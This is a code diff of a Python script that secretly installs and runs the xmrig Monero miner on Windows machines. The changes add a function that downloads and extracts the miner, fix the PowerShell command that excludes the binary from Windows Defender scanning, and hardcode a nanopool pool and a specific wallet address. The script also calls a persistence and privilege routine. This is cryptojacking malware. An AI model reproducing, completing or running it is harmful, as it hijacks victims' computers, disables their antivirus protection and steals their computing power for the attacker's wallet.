@@ -5,10 +5,8 @@ import sys
 import subprocess
 import json
 
-args = sys.argv
-
-xmrig_download_path = os.path.expanduser('~\\AppData\\Local')
-xmrig_version_name = os.listdir(os.path.join(xmrig_download_path, "/xmrig/"))
+xmrig_download_path = "%USERPROFILE%\\Documents"
+xmrig_version_name = "xmrig-6.20.0"
 
 def get_persistance_and_priv():
     # Startup + admin priv for windows systems
@@ -50,44 +48,66 @@ def get_persistance_and_priv():
             except Exception as e:
                 print(f"Error occurred: {e}")
 
+def get_xmrig():
+    download_command = ["curl", "-o", r"%USERPROFILE%\Documents\xmrig.zip", "-L", "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"]
+    extract_command = ["powershell", "-Command", "Expand-Archive -Path %USERPROFILE%\\Documents\\xmrig.zip -DestinationPath %USERPROFILE%\\Documents\\xmrig -Force"]
+    
+    subprocess.run(download_command, shell=True) # Get the binary
+    subprocess.run(extract_command, shell=True) # Extract binary
+
 def get_av_exclusion():
     # Set the exclusion path, so that xmrig.exe is excluded from virus scanning by windows defender
-    exclusion_path = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/xmrig.exe")
+    exclusion_path = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\xmrig.exe")
 
     # Run the command that adds the exclusion path to windows defender
     try:
-        subprocess.run(["powershell", "Add-MpPreference -ExcusionPath", exclusion_path], check=True)
+        subprocess.run(["powershell", "Add-MpPreference -ExclusionPath", exclusion_path], check=True)
     except:
         return
 
-
-def get_xmrig():
-    subprocess.run(f"curl -o {xmrig_download_path}/xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip") # Get the binary
-    subprocess.run(f"tar -xf {xmrig_download_path}/xmrig.zip") # Extract binary
-
-
-def edit_xmrig_config(xmr_adress:str):
+def edit_xmrig_config(xmr_address:str):
     # Get the file path, and take the [0] index of the xmrig_version_name since it would be equal to the only available file in the dir
-    xmrig_config = os.path.join(xmrig_download_path, f"/xmrig/{xmrig_version_name[0]}/config.json")
+    xmrig_config = os.path.expandvars(f"{xmrig_download_path}\\xmrig\\{xmrig_version_name}\\config.json")
 
     # Open the config files, then exchange the ["pools"] part of the json file, with this new ["pools"] value
     with open(xmrig_config, "r+") as config_file:
         data = json.load(config_file)
-        new_pools_value = {
-            "url": None,
-            "user": xmr_adress,
-            "pass": "x",
-            "rig-id": "optional_rig_identifier",
-            "enabled": True
-        }
 
-        data["pools"] = new_pools_value
-        config_file.close()
+        # Create a new "pools" list with your desired pool configuration
+        new_pools = [{
+            "algo": "rx/0",
+            "coin": None,
+            "url": "xmr-eu1.nanopool.org:10300",
+            "user": "49ugedDVzwYJ7TEFH9hK2FTsV9feseWH5Bo8KMXwKm8kAt1iK3F4xc588S1dMvDJJi3DqkC5QXYfGBorQwmLuNs1Apo4bNM",
+            "pass": "x",
+            "rig-id": "null",
+            "nicehash": False,
+            "keepalive": False,
+            "enabled": True,
+            "tls": False,
+            "tls-fingerprint": None,
+            "daemon": False,
+            "socks5": None,
+            "self-select": None,
+            "submit-to-origin": False
+        }]
+
+        # Replace the existing "pools" with the new list
+        data["pools"] = new_pools
+
+        # Move the file pointer to the beginning of the file before writing
+        config_file.seek(0)
+
+        # Write the modified JSON data back to the file
+        json.dump(data, config_file, indent=4)
+
+        # Truncate any remaining content (if the new data is smaller)
+        config_file.truncate()
 
 def run_xmrig():
     # Get the executable and config file, for the xmrig command
-    xmrig_executable = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/xmrig.exe")
-    xmrig_config = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/config.json")
+    xmrig_executable = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\xmrig.exe")
+    xmrig_config = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\config.json")
 
     # Construct xmrig command
     try:
@@ -100,9 +120,9 @@ def main():
         return
     
     get_persistance_and_priv()
-    get_av_exclusion()
     get_xmrig()
-    edit_xmrig_config(args[0])
+    get_av_exclusion()
+    edit_xmrig_config()
     run_xmrig()
 
 if __name__ == "__main__":
